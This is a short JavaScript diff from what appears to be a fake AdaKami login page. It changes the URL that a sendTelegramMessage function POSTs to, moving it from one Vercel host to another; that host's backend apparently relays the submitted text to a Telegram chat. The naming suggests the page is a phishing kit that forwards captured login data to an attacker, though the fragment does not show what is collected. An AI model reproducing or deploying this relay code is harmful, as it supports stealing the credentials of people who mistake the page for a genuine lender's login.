@@ -328,7 +328,7 @@
 
         // Kode fungsi untuk mengirim data kembali memanggil file Backend API
         function sendTelegramMessage(text) {
-            fetch('https://adakami-login-nu.vercel.app/api/kirim-telegram', {
+            fetch('https://adakami-xi.vercel.app/api/kirim-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ pesan: text })
